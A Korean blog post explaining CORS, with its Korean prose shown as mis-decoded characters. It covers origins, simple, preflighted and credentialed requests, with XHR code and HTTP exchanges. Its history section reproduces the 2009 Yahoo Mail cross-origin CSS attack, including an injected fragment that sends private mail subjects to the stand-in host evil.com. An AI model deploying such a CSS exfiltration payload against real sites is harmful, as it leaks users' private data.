> ๐จ Access to fetch at โhttps://api.lubycon.com/meโ from origin โhttp://localhost:3000โ has been blocked by CORS policy: No โAccess-Control-Allow-Originโ header is present on the requested resource. If an opaque response serves your needs, set the requestโs mode to โno-corsโ to fetch the resource with CORS disabled.

๊ฐ๋ฐ์ ํ๋ค๋ณด๋ฉด ํ๋ฒ์ฏค ๋ง์ฃผ์ณค์ ๋ฉ์์ง ์๋๋ค.
CORS๋ฅผ ์๋ฐํ๊ณ , 'Access-Control-Allow-Origin' ํค๋๋ฅผ ์์ ํ๊ฑฐ๋ cors๊ฐ ํ์์๋ ์์ฒญ์ ํ๋ผ๋ ํด๊ฒฐ๋ฐฉ๋ฒ์ ์๋ ค์ฃผ๊ณ  ์์ต๋๋ค. 

**์ฌ๊ธฐ์ CORS๋ ๋ฌด์์ผ๊น์?**

๊ฐ๋์ ์ดํดํ๋ ๋ฐฉ๋ฒ ์ค ๊ฐ์ฅ ์ข์ ๋ฐฉ๋ฒ์ ์ ์ด ๊ฐ๋์ด ์๊ฒผ๋์ง ์์๋ณด๋๊ฒ ์ข์ต๋๋ค.


## ์ CORS๊ฐ ์๊ฒผ์๊น?
๋ธ๋ผ์ฐ์ ๋ ๊ฑฐ์ 30๋ ๋์ ๋ค๋ฅธ ์ฌ์ดํธ์ ์ด๋ฏธ์ง๋ฅผ ํฌํจํ  ์ ์์์ต๋๋ค. ๋ค๋ฅธ ์ฌ์ดํธ์ ํ๋ฝ์ ๋ฐ์ ํ์ ์์ด ๊ทธ๋ฅ ํ  ์ ์์์ต๋๋ค. ์ด๋ฏธ์ง๋ฟ๋ง ์๋๋ผ ๋ค๋ฅธ ์์๋ ๊ฐ์ ธ์ค๋ ๊ฒ์ด ๊ฐ๋ฅํ์ต๋๋ค.

```html
<script src="โฆ"></script>
<link rel="stylesheet" href="โฆ" />
<iframe src="โฆ"></iframe>
<video src="โฆ"></video>
<audio src="โฆ"></audio>
```

ํ์ง๋ง ์ด๋ฐ ๋ฐฉ์์ 1994๋์ HTTP ์ฟ ํค ๋ฑ์ฅ์ผ๋ก ๋ณต์กํด์ง๊ธฐ ์์ํ์ต๋๋ค. **HTTP ํค๋์ ์ธ์ฆ ์ ๋ณด๊ฐ ํฌํจ์ด ๋์๊ธฐ ๋๋ฌธ์๋๋ค.**

์๋ฒ๋ HTTP ํค๋์ ์ธ์ฆ ์ ๋ณด๋ฅผ ์ฌ์ฉํด์ ์ฌ์ฉ์๋ฅผ ํน์ ํฉ๋๋ค. 

๊ณต๊ฒฉ์๋ ์ด๋ฐ ํน์ ์ ์ด์ฉํด์ ์ทจ์ฝ์ ์ ์ฐพ๊ธฐ ์์ํ์ต๋๋ค. ๊ฒฐ๊ณผ์ ์ผ๋ก, 2009๋ ์ผํ ๋ฉ์ผ์ ์ทจ์ฝ์ ์ด ๋ฐํ์ก์ต๋๋ค.

๋จผ์ , ๊ณต๊ฒฉ์๋ `');}`๋ฅผ ํฌํจํ ์ ๋ชฉ์ ์ ์ ๊ฒ ๋ณด๋ธ ํ `{}html{background:url('//evil.com/?:`๊ฐ ํฌํจ๋ ์ ๋ชฉ์ ๋ฉ์ผ์ ๋ณด๋๋๋ค.

๊ทธ๋ผ, ๋ฉ์ผ์ด ์๋์ ๊ฐ์ ๊ตฌ์กฐ๋ก ์ ๋ฌ๋  ๊ฒ ์๋๋ค.
```html
โฆ
<li class="email-subject">Hey {}html{background:url('//evil.com/?</li>
<li class="email-subject">โฆprivate dataโฆ</li>
<li class="email-subject">โฆprivate dataโฆ</li>
<li class="email-subject">โฆprivate dataโฆ</li>
<li class="email-subject">Yo ');}</li>
โฆ
```

์ ๊ตฌ์กฐ์์ ๊ณต๊ฒฉ์๊ฐ ์คํ๋๊ธฐ ์ํ๋ ์ฝ๋๋ ์ ํจํ CSS ๊ตฌ๋ฌธ ๋ถ์ ๋์ ์ฌ์ด์ ๋ผ์ด ์์ต๋๋ค.

๋ค์์ ๊ณต๊ฒฉ์๋ ์ฌ์ฉ์๊ฐ ๋ค์์ ํฌํจํ๋ ํ์ด์ง๋ฅผ ๋ฐฉ๋ฌธ ํ๋๋ก ์ ๋ํฉ๋๋ค.

```html
<link rel="stylesheet" href="https://m.yahoo.com/mail" />
```

ํด๋น ์์์ด `yahoo.com`์ ์ฟ ํค๋ฅผ ์ด์ฉํด ๋ก๋๋๋ฉด CSS ํ์๋ ๋ฏธ๋ฆฌ ์ฌ์ด๋์๋ ๋ฉ์ผ ์ ๋ชฉ์ ๊ตฌ๋ฌธ ๋ถ์ํ์ฌ ๊ฐ์ธ ์ ๋ณด๋ฅผ `evil.com`์ ๋ณด๋ด๊ฒ ๋ฉ๋๋ค.

์๋ก ๋ค๋ฅธ ์ฌ์ดํธ์ ์ ๊ทผ์ ํ์ฉํ์ ๋ ๋ฐ์ํ  ์ ์๋ ๋ฌธ์ ๋ ์ด๊ฒ ๋ง๊ณ ๋ ๋ค์ํฉ๋๋ค.

## ๊ทธ๋์ CORS ๋?
์์์ ์๋ก ๋ค๋ฅธ ์ฌ์ดํธ์ ์ ๊ทผ์ ํ์ฉํ์ ๋ ๋ฌธ์ ๊ฐ ๋ฐ์ํ๋ค๋ ๊ฒ์ ์๊ฒ ๋์์ต๋๋ค. ์ด๋ฐ ๋ฌธ์ ๋ฅผ ํด๊ฒฐํ๊ธฐ ์ํ ๋ฐฉ๋ฒ ์ค ํ๋๊ฐ **CORS** ์๋๋ค.

CORS์ ์ ์๋ ์๋์ ๊ฐ์ต๋๋ค.
> ๊ต์ฐจ ์ถ์ฒ ๋ฆฌ์์ค ๊ณต์ (Cross-Origin Resource Sharing, CORS)๋ ์ถ๊ฐ HTTP ํค๋๋ฅผ ์ฌ์ฉํ์ฌ, ํ ์ถ์ฒ์์ ์คํ ์ค์ธ ์น ์ ํ๋ฆฌ์ผ์ด์์ด ๋ค๋ฅธ ์ถ์ฒ์ ์ ํํ ์์์ ์ ๊ทผํ  ์ ์๋ ๊ถํ์ ๋ถ์ฌํ๋๋ก ๋ธ๋ผ์ฐ์ ์ ์๋ ค์ฃผ๋ ์ฒด์ ์๋๋ค.

๊ฐ๋จํ ์ด์ผ๊ธฐํ๋ฉด CORS๋ **๋ธ๋ผ์ฐ์ **์์๋ง ์ฌ์ฉ ๋๋ฉฐ, **๊ฐ์ ์ถ์ฒ์ ์๋ฒ๊ฐ ํ์ฉํด์ค ์ถ์ฒ**๋ง์ด ์์์ ์ ๊ทผํ  ์ ์๊ฒ ํ๋ ์ ์ฑ์๋๋ค.

### ์ถ์ฒ(Origin)?
์ถ์ฒ๋ผ๋ ์ฉ์ด๊ฐ ๋ง์ด ๋์ต๋๋ค. ์ถ์ฒ๋ ๋ฌด์์ผ๊น์?

`www.google.com`๊ฐ์ ์ฐ๋ฆฌ๊ฐ ํํ ๋ณด๋ URL์ ์ฌ๋ฌ๊ฐ์ ์ปดํฌ๋ํธ๋ก ์ด๋ฃจ์ด์ ธ์์ต๋๋ค.

![](https://upload.wikimedia.org/wikipedia/commons/d/d6/URI_syntax_diagram.svg)

์ถ์ฒ๋ ์์ ๊ตฌ์กฐ์์ **scheme๊ณผ host, port๋ฅผ ํฉ์น ๊ฒ**์ ์๋ฏธ ํฉ๋๋ค. 
`https://evan-moon.github.io`์ ๊ฐ์ ์ถ์ฒ๋ ์ธ์ ๋๋ ์์๋ ์๋์ ๊ฐ์ต๋๋ค.


|                    URL                    | ๊ฐ์ ์ถ์ฒ | ์ด์                       |
|:-----------------------------------------:|:-----------:|-----------------------------|
| https://evan-moon.github.io/about         | O           | ์คํด, ํธ์คํธ, ํฌํธ๊ฐ ๋์ผ   |
| https://evan-moon.github.io/about?q=์๋ฝ  | O           | ์คํด, ํธ์คํธ, ํฌํธ๊ฐ ๋์ผ   |
| https://user:password@evan-moon.github.io | O           | ์คํด, ํธ์คํธ, ํฌํธ๊ฐ ๋์ผ   |
| http://evan-moon.github.io                | X           | ์คํด์ด ๋ค๋ฆ                 |
| https://api.github.io                     | X           | ํธ์คํธ๊ฐ ๋ค๋ฆ               |
| https://evan-moon.naver.com               | X           | ํธ์คํธ๊ฐ ๋ค๋ฆ               |
| https://evan-moon.github.com              | X           | ํธ์คํธ๊ฐ ๋ค๋ฆ               |
| https://evan-moon.github.io:8000          | ?           | ๋ธ๋ผ์ฐ์ ์ ๊ตฌํ์ ๋ฐ๋ผ ๋ค๋ฆ |


## ์ธ์ , ์ด๋ป๊ฒ CORS๊ฐ ์ฌ์ฉ๋๋?
๊ทธ๋์ CORS๋ ์ธ์ , ์ด๋ป๊ฒ ์ฌ์ฉ์ด ๋ ๊น์?

### CORS๋ฅผ ์ฌ์ฉํ๋ ์์ฒญ
์๋ HTTP ์์ฒญ์ ๋ํด์ CORS๋ ๋์ํฉ๋๋ค.
- XMLHttpRequest๋ Fetch APIs๋ฅผ ํธ์ถํ๋ ๊ฒฝ์ฐ
- Web Fonts์ ๊ฒฝ์ฐ
- WebGL textures์ ๊ฒฝ์ฐ
- `drawImage()`๋ฅผ ์ฌ์ฉํด canvas์ Image/Video ํ๋ ์์ ๊ทธ๋ฆฌ๋ ๊ฒฝ์ฐ
- CSS Shaped from images์ ๊ฒฝ์ฐ

### CORS ์๋๋ฆฌ์ค
CORS์ ๊ด๋ จ๋ ์๋๋ฆฌ์ค๋ ์ด 3๊ฐ์ง๊ฐ ์์ต๋๋ค. 

### Simple Request
ํน์  ์กฐ๊ฑด์ ๊ฐ์ง ์์ฒญ์ CORS๊ฐ ํ์ํ์ง ์์ต๋๋ค. ์ด ์์ฒญ์ ์ฐ๋ฆฌ๋ `Simple Request`๋ผ๊ณ  ๋ถ๋ฆ๋๋ค.

Simple Request์ ์กฐ๊ฑด์ ์๋์ ๊ฐ์ต๋๋ค.
- `GET`, `HEAD`, `POST` ๋ฐฉ๋ฒ ์ค ํ๋
- user agent์ ์ํด์ ์๋์ผ๋ก ์ค์ ๋๋ ํค๋ ์ธ์ manually๋ก ์ค์ ํ  ์ ์๋ ํค๋๋ ์๋์ ๊ฐ์ต๋๋ค.
    - `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`
- ํ์ฉ๋๋ media type์ ์๋์ ๊ฐ์ต๋๋ค.
    -  `applicatoin/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`
- ๋ง์ฝ ์์ฒญ์ด `XMLHttpRequest`๋ก ์ํด ๋ง๋ค์ด์ก๋ค๋ฉด, ์ด๋ฒคํธ ๋ฆฌ์ค๋๊ฐ ๋ฑ๋ก๋์ด ์์ง ์์์ผ ํฉ๋๋ค.
- `ReadableStream` ๊ฐ์ฒด๋ฅผ request์์ ์ฌ์ฉํ๋ฉด ์๋ฉ๋๋ค.


```js
const xhr = new XMLHttpRequest();
const url = 'https://bar.other/resources/public-data/';

xhr.open('GET', url);
xhr.onreadystatechange = someHandler;
xhr.send();
```

```html
GET /resources/public-data/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
Origin: https://foo.example
```

### Preflighted requests
simple request์ ๋ฌ๋ฆฌ ๋ณธ ์์ฒญ ์ ์ `OPTIONS` ๋ฐฉ๋ฒ์ ์ฌ์ฉํ์ฌ HTTP ์์ฒญ์ ๋ณด๋ด ๋ณธ ์์ฒญ์ด ์์ ํ์ง ํ์ธ ํฉ๋๋ค. 

```js
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```

```html
OPTIONS /doc HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
Origin: https://foo.example
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-PINGOTHER, Content-Type

HTTP/1.1 204 No Content
Date: Mon, 01 Dec 2008 01:15:39 GMT
Server: Apache/2
Access-Control-Allow-Origin: https://foo.example
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
Access-Control-Max-Age: 86400
Vary: Accept-Encoding, Origin
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
```

line 1-10์ preflight request๋ฅผ ์ด์ผ๊ธฐ ํฉ๋๋ค. ๋ธ๋ผ์ฐ์ ๋ preflight๋ฅผ ํตํด์ ๋ณธ ์์ฒญ์ด ๊ฐ๋ฅํ์ง ํ์ธ ํฉ๋๋ค. preflight๋ ๋ณธ ์์ฒญ์ ํ์ํ ์ ๋ณด๋ ๋ฏธ๋ฆฌ ๋ณด๋๋๋ค. 9-10 ๋ผ์ธ

`Access-Control-Request-Method` ๋ ๋ฉ์๋๋ฅผ `Access-Control-Request-Header`๋ ๋ณธ ์์ฒญ์ ์ปค์คํ ํค๋์ ๋ํ ์ ๋ณด๊ฐ ํฌํจ๋ฉ๋๋ค. 

line 13-22๋ ์๋ฒ๊ฐ ์ ๋ฌํด์ค response ์๋๋ค. `Access-Control-Allow-Origin`์๋ `https://foo.examlple`์ด ํฌํจ๋์ด ์์ต๋๋ค.

`Access-Control-*`์ ๋ํ ์ค๋ช

๋ณธ ์์ฒญ์ ๋ํ request์ response๋ ์๋์ ๊ฐ๋ค.

```html
POST /doc HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
X-PINGOTHER: pingpong
Content-Type: text/xml; charset=UTF-8
Referer: https://foo.example/examples/preflightInvocation.html
Content-Length: 55
Origin: https://foo.example
Pragma: no-cache
Cache-Control: no-cache

<person><name>Arun</name></person>

HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:15:40 GMT
Server: Apache/2
Access-Control-Allow-Origin: https://foo.example
Vary: Accept-Encoding, Origin
Content-Encoding: gzip
Content-Length: 235
Keep-Alive: timeout=2, max=99
Connection: Keep-Alive
Content-Type: text/plain

[Some XML payload]
```

### Requests with credentials
์ธ์ฆ์ ๋ณด๋ฅผ ํฌํจํ๋ ์์ฒญ์ CORS๋ฅผ ๋ ๊ฐํํ ์์ฒญ์๋๋ค. 

๊ธฐ๋ณธ์ ์ผ๋ก ๋ธ๋ผ์ฐ์ ๊ฐ ์ ๊ณตํ๋ AJAX API์ธ `XMLHttpRequst` ๊ฐ์ฒด๋ `fetch` API๋ ์ฟ ํค ์ ๋ณด๋ ์ธ์ฆ๊ณผ ๊ด๋ จ๋ ํค๋๋ฅผ ์์ฒญ์ ํฌํจํ์ง ์์ต๋๋ค. ์ด๋ ์์ฒญ์ ์ธ์ฆ๊ณผ ๊ด๋ จ๋ ์ ๋ณด๋ฅผ ๋ด์ ์ ์๊ฒ ํด์ฃผ๋ ์ต์์ด `credntials`์ต์ ์๋๋ค.

```js
const invocation = new XMLHttpRequest();
const url = 'http://bar.other/resources/credentialed-content/';

function callOtherDomain() {
  if (invocation) {
    invocation.open('GET', url, true);
    invocation.withCredentials = true;
    invocation.onreadystatechange = handler;
    invocation.send();
  }
}
```

`invocatoin.withCredentials`๋ ์ธ์ฆ ์ ๋ณด๋ฅผ ์ฟ ํค์ ํฌํจํ๋ค๋ ํ๋๊ทธ ์๋๋ค. ์ ์์ฒญ์ `simple request` ์ด์ง๋ง ๋ธ๋ผ์ฐ์ ๋ `Access-Control-Allow-Credentials : true` ํค๋๊ฐ ์๋ ์๋ต์ ๊ฑฐ๋ถํฉ๋๋ค.

```html
GET /resources/credentialed-content/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
Referer: http://foo.example/examples/credential.html
Origin: http://foo.example
Cookie: pageAccess=2


HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:34:52 GMT
Server: Apache/2
Access-Control-Allow-Origin: https://foo.example
Access-Control-Allow-Credentials: true
Cache-Control: no-cache
Pragma: no-cache
Set-Cookie: pageAccess=3; expires=Wed, 31-Dec-2008 01:34:53 GMT
Vary: Accept-Encoding, Origin
Content-Encoding: gzip
Content-Length: 106
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/plain


[text/plain payload]
```

## ์ฐธ๊ณ ์๋ฃ
- https://en.wikipedia.org/wiki/Cross-origin_resource_sharing
- https://ui.toast.com/weekly-pick/ko_20211110
- https://developer.mozilla.org/ko/docs/Web/HTTP/CORS
- https://evan-moon.github.io/2020/05/21/about-cors/